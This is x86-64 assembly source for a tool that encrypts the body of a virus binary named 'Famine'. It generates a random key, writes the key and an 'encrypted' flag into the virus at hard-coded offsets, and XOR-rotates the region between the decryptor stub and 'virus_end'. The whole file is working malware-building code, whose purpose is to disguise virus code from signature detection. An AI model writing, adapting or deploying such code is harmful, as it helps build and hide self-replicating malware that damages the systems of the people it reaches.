; Simple encryption program for Famine
%define SYS_READ        0
%define SYS_WRITE       1
%define SYS_OPEN        2
%define SYS_CLOSE       3
%define SYS_LSEEK       8
%define SYS_EXIT        60
%define SYS_GETRANDOM   318

%define O_RDWR          2
%define SEEK_SET        0
%define SEEK_END        2

%define KEY_SIZE        16

section .data
    famine_path:    db "Famine", 0
    msg_success:    db "Encrypted successfully", 10, 0
    msg_error:      db "Error", 10, 0

section .bss
    key_buffer:     resb KEY_SIZE
    file_buffer:    resb 65536
    file_size:      resq 1

section .text
global _start

print_str:
    push rbp
    mov rbp, rsp
    mov rsi, rdi
    xor rdx, rdx
.loop:
    cmp byte [rsi + rdx], 0
    je .done
    inc rdx
    jmp .loop
.done:
    mov eax, 1
    mov edi, 1
    syscall
    pop rbp
    ret

generate_key:
    mov eax, 318
    lea rdi, [rel key_buffer]
    mov esi, KEY_SIZE
    xor edx, edx
    syscall
    ; Convert to alphanumeric
    xor rcx, rcx
.loop:
    cmp rcx, KEY_SIZE
    jge .done
    lea rsi, [rel key_buffer]
    movzx eax, byte [rsi + rcx]
    xor rdx, rdx
    mov ebx, 62
    div ebx
    cmp edx, 10
    jl .digit
    cmp edx, 36
    jl .upper
    sub edx, 36
    add edx, 'a'
    jmp .store
.upper:
    sub edx, 10
    add edx, 'A'
    jmp .store
.digit:
    add edx, '0'
.store:
    mov byte [rsi + rcx], dl
    inc rcx
    jmp .loop
.done:
    ret

encrypt_buffer:
    ; rdi = buffer, rsi = size
    push rbp
    mov rbp, rsp
    xor rbx, rbx
    xor r8, r8
.loop:
    cmp rbx, rsi
    jge .done
    mov al, [rdi + rbx]
    mov rax, r8
    xor rdx, rdx
    mov rcx, KEY_SIZE
    div rcx
    lea r10, [rel key_buffer]
    mov r9b, [r10 + rdx]
    mov al, [rdi + rbx]
    xor al, r9b
    rol al, 3
    mov [rdi + rbx], al
    inc rbx
    inc r8
    jmp .loop
.done:
    pop rbp
    ret

_start:
    ; Open file
    mov eax, 2
    lea rdi, [rel famine_path]
    mov esi, O_RDWR
    syscall
    test rax, rax
    js error
    mov r12, rax
    
    ; Get size
    mov eax, 8
    mov edi, r12d
    xor esi, esi
    mov edx, 2
    syscall
    mov [rel file_size], rax
    
    ; Read file
    mov eax, 8
    mov edi, r12d
    xor esi, esi
    xor edx, edx
    syscall
    mov eax, 0
    mov edi, r12d
    lea rsi, [rel file_buffer]
    mov rdx, [rel file_size]
    syscall
    
    ; Generate key
    call generate_key
    
    ; Write key to encryption_key location in buffer
    ; encryption_key is at virus_start + 8 = 0x13ce
    lea rdi, [rel file_buffer]
    add rdi, 0x13ce
    lea rsi, [rel key_buffer]
    mov rcx, KEY_SIZE
.write_key:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    test rcx, rcx
    jnz .write_key
    
    ; Set encrypted flag at virus_start + 24 = 0x13de
    mov byte [rdi], 1
    
    ; Encrypt from decrypt_code.end (0x1522) to virus_end (0x1b59)
    lea rdi, [rel file_buffer]
    add rdi, 0x1522
    mov rsi, 0x637      ; Size: virus_end - decrypt_code.end
    call encrypt_buffer
    
    ; Write back
    mov eax, 8
    mov edi, r12d
    xor esi, esi
    xor edx, edx
    syscall
    mov eax, 1
    mov edi, r12d
    lea rsi, [rel file_buffer]
    mov rdx, [rel file_size]
    syscall
    
    ; Close
    mov eax, 3
    mov edi, r12d
    syscall
    
    lea rdi, [rel msg_success]
    call print_str
    
    mov eax, 60
    xor edi, edi
    syscall

error:
    lea rdi, [rel msg_error]
    call print_str
    mov eax, 60
    mov edi, 1
    syscall
